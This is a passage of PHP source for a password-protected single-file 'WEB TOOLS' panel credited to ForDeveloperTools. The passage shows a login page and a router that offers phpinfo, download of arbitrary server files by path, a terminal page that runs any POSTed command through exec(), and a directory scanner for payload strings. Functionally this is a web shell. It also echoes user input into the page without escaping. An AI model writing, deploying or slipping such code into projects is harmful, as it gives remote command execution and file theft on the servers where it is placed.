        removeElem(elemId);
        $('.box-file-scan').html('<div id="file-scan-log"></div>');
    }

    function setValueTo(elemID = null, val = null){
        $(elemID).val(atob(val));
    }

    $("#file-scan-input").submit( function () {
            
        var scanDir = $('#scan_dir').val(); 
        var scanFor = $('#scan_for').val(); 
        var scanPayload = $('#scan_payload').val(); 
        

        
        $('#submitFileScan').attr("disabled", true);

        $('#file-scan-log').prepend('<div class="box-msg d-block"><center><div class="loadingLogFileScan"><img src="<?= $webTools->loadImage ?>" width="20px" height="20px" /> Loading...</div></center></div>');

        $.ajax({
            type: 'POST',
            url: "<?= $webTools->baseLink; ?>?page=scanning-file",
            dataType: 'html',
            cache: false, 
            data: {
                scan_dir: scanDir,
                scan_for: scanFor,
                scan_payload: scanPayload
            },
            success: function(data){
                removeElem('.loadingLogFileScan');
                removeVal('#command');
                $('#submitFileScan').attr("disabled", false);
                $('#file-scan-log').prepend('<div class="box-msg">'+ data +'</div>'); 
          
            },
            error: function (e) {
                removeElem('.loadingLogTerm');
                $('#submitFileScan').attr("disabled", false);
                $('#file-scan-log').prepend('<div class="box-msg">Failed. Error Message: '+ e +'</div>'); 
            }
        });

        return false;   
    });

</script>
</body>
</html>
<?php 
    // END OF DASHOBARD
    }

    // START LOGIN PAGE
    function loginPage($webTools = false){
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEB TOOLS</title>
    <?= $webTools->loadMetaLink(); ?>
    <title>LOGIN PAGE</title>

    <?= $webTools->addCssGlobal(); ?>

    <style>

        @import url('https://fonts.googleapis.com/css2?family=Dosis:wght@200;300;400;500;600;700;800&display=swap');
        @import url('https://fonts.googleapis.com/css?family=Bungee:wght@100;200;300;400;500;600;700;800');

        * {
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
        }

        body {
            font-family: "Dosis", cursive;
            background: #292D3E;
        }

        .set-full-height {
            min-height: 100vh;
        }

        .user-logo {
            border-radius: 50%;
            height: 80px;
            width: 80px;
            border: 3px solid #292D3E;
            /* filter: contrast(200%); */
            margin-bottom: 20px;
            padding: 5px;
        }

        .user-name {
            font-weight: 600;
        }

        .footer-text {
            font-size: 12px;
            font-weight: 600;
            display: block;
            margin-top: 20px;
            color: #6c757d;
        }

        .text-primary {
            color: #6c757d !important;
        }

        .bg-transparent {
            background-color: rgba(0, 0, 0, .0) !important;
        }

        .form-control {
            background: rgba(0, 0, 0, .0) !important;
            border-color: #6c757d !important;
        }

        /* scrollbar */
        /* width */
        ::-webkit-scrollbar {
            width: 5px;
        }

        /* Track */
        ::-webkit-scrollbar-track {
            background: #000000; 
        }
        
        /* Handle */
        ::-webkit-scrollbar-thumb {
            background: #000000; 
        }

        /* Handle on hover */
        ::-webkit-scrollbar-thumb:hover {
            background: #555; 
        }
    </style>
</head>
<body>
    
    <div class="container">
        <div class="row mx-auto my-auto set-full-height">
            <div class="col-md-4"></div>
            <div class="col-md-4 my-auto mx-auto">
                <form action="<?= $webTools->baseLink; ?>" method="post">
                    <!-- profile content login -->
                    <div class="row mx-auto my-auto">
                        <div class="col-md-12 mx-auto my-auto">
                            <center>
                                <img src="<?= $webTools->userImage; ?>" alt="" class="user-logo">
                                <br>
                                <span class="text-white"><small class="user-name">-- WELCOME <?= $webTools->userName ?> --</small></span>
                                <br><br>
                            </center>
                        </div>
                    </div>
                    <!-- body form login -->
                    <div class="input-group mb-3 bg-transparent">
                        <input type="text" class="form-control" name="password_login" placeholder="Password" class="bg-transparent" required/>
                        <div class="input-group-append">
                            <button class="btn btn-outline-secondary bg-transparent" type="submit">
                                <i class="fa-solid fa-arrow-right"></i>
                            </button>
                        </div>
                    </div>
                    <!-- footer login -->
                    <div class="row mx-auto my-auto">
                        <div class="col-md-12 mx-auto my-auto">
                            <center>
                                <span class="footer-text">&copy;Copyright <?= date('Y') ?>. By <a href="https://github.com/fordevelopertools" target="_blank" class="text-primary">ForDeveloperTools</a></span>
                            </center>
                        </div>
                    </div>

                    <!-- reload -->
                    <?= $webTools->goHome(); ?>
                </form>
            </div>
            <div class="col-md-4"></div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</body>
</html>
<?php
    }

    // logout
    if($webTools->checkLogin() && isset($_GET['logout'])){
        $webTools->logout($webTools->baseLink);
    }

    // check input login
    $pass_formlogin = isset($_POST['password_login']) ? $_POST['password_login'] : null;
    if ($webTools->login_auth($pass_formlogin)) {
        
        $webTools->redirect($webTools->baseLink);

    } else {

        // check session for access features & pages restricted.
        if($webTools->checkLogin()){

            // php info feature
            $pageShow = $webTools->pageActive();
            if($pageShow == 'phpinfo'){

                $webTools->loadMetaLink();
                $webTools->addCssGlobal('
                    h1, h2 {color: #fff !important;} 
                    table, tr, td, th {background-color: var(--primary-color) !important; color: white !important;
                    box-shadow: 0px 0px 0px 0px transparent !important; font-size: var(--body-text-content-font-size) !important; padding: 8px !important; 
                    }
                    th { background-color: black !important;}
                ');
                @phpinfo();
                $webTools->goHome();

            } elseif ($pageShow == 'download'){
                if(isset($_GET['file']) && trim($_GET['file']) !== ''){
                    $downloadFile = $webTools->download(trim($_GET['file']));
                    if ($downloadFile) {
                        // do something
                    } else {
                        echo "Download failed. File not found.";
                    }
                }else{
                    echo "Please add file to download.";
                }
            } elseif($pageShow == 'terminal-execute'){
                
                $infoPost = $_POST['info_post'];
                $command = trim($_POST['command']);
                echo "
                <div class='badge badge-warning badge-custom-notice-term'>[--$infoPost--] ". date('H:i d-m-Y') ."</div>
                <div>
                    <div class='badge badge-primary text-white badge-custom-notice-term'>===>></div>&nbsp;&nbsp;&nbsp; $command 
                </div>
                ";
                echo "<div style='border-left: 2px dotted grey; padding-left: 10px;'>";
                if ($webTools->is_shell_exec_available()) {
                    @exec($command, $output, $var);
                    foreach ($output as $key => $value) {
                        echo '<div>'. htmlentities($value) . '</div>';
                    }
                } else {
                    echo "<div><div class='badge badge-danger'>Exec not available.</div></div>";
                }
                echo "</div>";   
            }

            elseif($pageShow == 'scanning-file'){
                
                $scanFor = $_POST['scan_for'];
                $scanDir = trim($_POST['scan_dir']);
                $scanPayload = trim($_POST['scan_payload']);

                

                if ($scanPayload !== '') {
                    $scanPayloadArr = explode(';', $scanPayload);
                } else {
                    $scanPayloadArr = [];
                }

                $getScan = $webTools->fileScan($scanDir, $scanPayloadArr, $scanFor);

                if (is_array($getScan) && count($getScan) > 0) {

                    $totalItem = count($getScan);

                    echo "
                    <div class='badge badge-warning badge-custom-notice-term'>[$scanDir <=> $scanFor] ". date('H:i d-m-Y') ."</div>
                    <div>
                        <div class='badge badge-primary text-white badge-custom-notice-term'>search for>></div>&nbsp;&nbsp;&nbsp; $scanPayload 
                    </div>
                    ";

                    echo "
                        <div style='border-left: 2px dotted grey; padding-left: 10px;'>
                        <div class='row'>
                            <div class='col-md-12 p-2 m-2 text-bold'><strong>Total Item: $totalItem</strong></div>
                        </div>
                    ";
                    $nox = 1;
                    foreach ($getScan as $key => $value) {
                        echo '<div style="border-bottom: 2px dotted grey; padding-left: 10px; padding-bottom: 8px; padding-top: 8px;">'. $nox .')&nbsp;&nbsp;&nbsp;'. $value['item'];

                        if ($value['type'] == 'folder') {
                            echo '
                            <div class="row">
                                <div class="col-md-12 mt-1 mb-1"><strong>Type: '. $value['type'] .'</strong> | <span onclick=\'setValueTo("#scan_dir", "'. base64_encode($value['item']) .'");\' class="badge badge-primary text-white set-scan-file">Set Search</span></div>
                            </div>
                            ';
                        }else{
                            echo '
                            <div class="row">
                                <div class="col-md-12 mt-1 mb-1"><strong>Type: '. $value['type'] .'</strong> | <a href="'. $webTools->baseLink .'?page=download&file='. $value['item'] .'"><span class="badge badge-success text-white set-scan-file">Download</span></a></div>
                            </div>
                            ';
                        }
                        
                        echo '</div>';
                        $nox++;
                    }
                    
                    echo "</div>";
                    
                } else {
                    echo "<div><div class='badge badge-danger'>Results 0 or Failed.</div></div>";
                }
                

                // echo "
                // <div class='badge badge-warning badge-custom-notice-term'>[--$infoPost--] ". date('H:i d-m-Y') ."</div>
                // <div>
                //     <div class='badge badge-primary text-white badge-custom-notice-term'>===>></div>&nbsp;&nbsp;&nbsp; $command 
                // </div>
                // ";
                // echo "<div style='border-left: 2px dotted white; padding-left: 10px;'>";
                // if ($webTools->is_shell_exec_available()) {
                //     @exec($command, $output, $var);
                //     foreach ($output as $key => $value) {
                //         echo '<div>'. $value. '</div>';
                //     }
                // } else {
                //     echo "<div><div class='badge badge-danger'>Exec not available.</div></div>";
                // }
                // echo "</div>";
                
            }
            
            else {
                dashboardPage($webTools);
            }

        }else{
            loginPage($webTools);
        }

    }

?>